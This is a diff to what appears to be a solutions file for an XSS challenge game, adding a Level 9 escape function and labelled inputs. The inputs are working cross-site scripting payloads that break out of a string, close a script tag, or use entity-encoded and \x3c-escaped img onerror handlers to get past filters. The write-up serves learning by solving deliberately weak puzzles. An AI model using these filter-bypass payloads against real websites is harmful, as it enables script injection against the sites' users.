@@ -135,6 +135,8 @@ LEVEL 7
         return "<script>" + thing[0] + "(" + json +")</script>";
     }
 
+INPUT:
+
     '#';alert(1)//
     
 
@@ -145,8 +147,42 @@ LEVEL 8
         return '<script>console.log("' + s.toUpperCase() + '")</script>';
     }
     
+INPUT:
+    
     ")</script><img src onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;//
     ")</script><img src onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)//
     ")</script><img src onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)
                                                  LINE BREAK HERE ☝
+                                                 
+LEVEL 9
+-------
+
+    function escape(s) {
+        function htmlEscape(s) {
+            return s.replace(/./g, function(x) {
+                return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;       
+            });
+        }
+
+        function expandTemplate(template, args) {
+            return template.replace(/{(\w+)}/g, function(_, n) { 
+                return htmlEscape(args[n]);
+            });
+        }
+
+        return expandTemplate(
+            "                                                   \n\
+                <h2>Hello, <span id=name></span>!</h2>          \n\
+                <script>                                        \n\
+                    var v = document.getElementById('name');    \n\
+                    v.innerHTML = '<a href=#>{name}</a>';       \n\
+                <\/script>                                      \n\
+            ",
+            { name : s }
+        );
+    }
+
+INPUT:
+
+    \x3cimg src=a onerror=alert(1)\x3e
 
